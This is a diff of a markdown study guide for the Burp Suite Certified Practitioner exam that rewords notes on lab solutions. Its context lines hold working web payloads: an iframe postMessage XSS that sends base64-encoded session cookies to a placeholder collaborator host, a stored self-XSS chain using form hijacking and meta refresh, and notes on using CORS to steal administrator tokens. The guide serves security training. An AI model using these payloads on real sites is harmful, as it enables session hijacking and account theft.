@@ -278,7 +278,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 <iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=fetch(`https://COLLABORATOR.com?collector=`+btoa(document.cookie))>','*')">
 ```  
 
->Replacing the Burp Lab payload ```print()``` with ```fetch()``` to steal the victim session cookie.  
+>Replacing the Burp Lab payload ```print()``` with ```fetch()``` in the above code allow attacker to steal the victim session cookie.  
 
 ![AddEventListener Ads Message](images/AddEventListener-Ads-Message.png)  
 
@@ -728,22 +728,21 @@ body:document.cookie
 
 #### Upgrade stored self-XSS  
 
->Blog comment with **Stored self-XSS**, upgrading the payload to steal victim information from DOM. The function **edit content** reflect the input in the `<script>` tag. The CSRF token for the **write comment** is same as the **edit content** functions. Below payload use **write comment** and **edit content**. to exploit victim. The `a` character is added to escape the `#` hash character from the initial application `source code`. The below `source code` in the blog entry is full exploit to steal victim info.  
+>Blog comment with **Stored self-XSS**, upgrading the payload to steal victim information from DOM. The function **edit content** reflect the input in the `<script>` tag. The CSRF token for the **write comment** is same as the **edit content** functions. Below payload use **write comment** function to make the victim create a blog entry on their on blog with our malicious content. The `a` character is added to escape the `#` hash character from the initial application `source code`. The below `source code` in the blog entry is full exploit to steal victim info.  
 
 ```html
 <button form=comment-form formaction="/edit" id=share-button>Click Button</button>
 <input form=comment-form name=content value='<meta http-equiv="refresh" content="1; URL=/edit" />'>
-<input form=comment-form name=tags value='a");alert(document.getElementsByClassName("navbar-brand")[0].innerText)//'> 
-
+<input form=comment-form name=tags value='a");alert(document.getElementsByClassName("navbar-brand")[0].innerText)//'>
 ```  
 
->Deliver Exploit, by Sending url that reference the above blog entry to the victim will trigger XSS as them.  
+>This target is exploited by constructing an HTML injection that clobbers a variable named `share_button` and uses XSS code above. The content is reflected on the page, then using `meta http-equiv` tag to refresh page after 1 second result in redirecting to `/edit`.  
 
 ```
 https://challenge-1222.intigriti.io/blog/unique-guid-value-abc123?share=1
 ```  
 
->The content is reflected on the page we use `meta http-equiv` tag to refresh `/edit` page after 1 second. This target is exploited by constructing an HTML injection that clobbers a variable named `share_button` and uses XSS code above.  
+>Deliver Exploit, by Sending url that reference the above blog entry to the victim will trigger XSS as them.  
 
 [intigriti - Self-XSS upgrade - Solution to December 22 XSS Challenge](https://youtu.be/FowbZ8IlU7o)  
 
@@ -2271,7 +2270,7 @@ Origin: http://subdomain.TARGET.NET
 
 ![Subdomain cors xss](images/subdomain-cors-xss.png)  
 
->Place code in the exploit server body and **Deliver exploit to victim** to steal the AJAX session token and API key. In the BSCP exam the cors stolen JSON data include the administrator session token, and can be used to escalate privilege.  
+>Place code in the exploit server body and **Deliver exploit to victim** to steal the AJAX session token and API key. In the BSCP exam use the [CORS](#cors) vulnerability to steal JSON data that also include the administrator session token, and can be used to escalate privilege.  
 
 ```html
 <script>
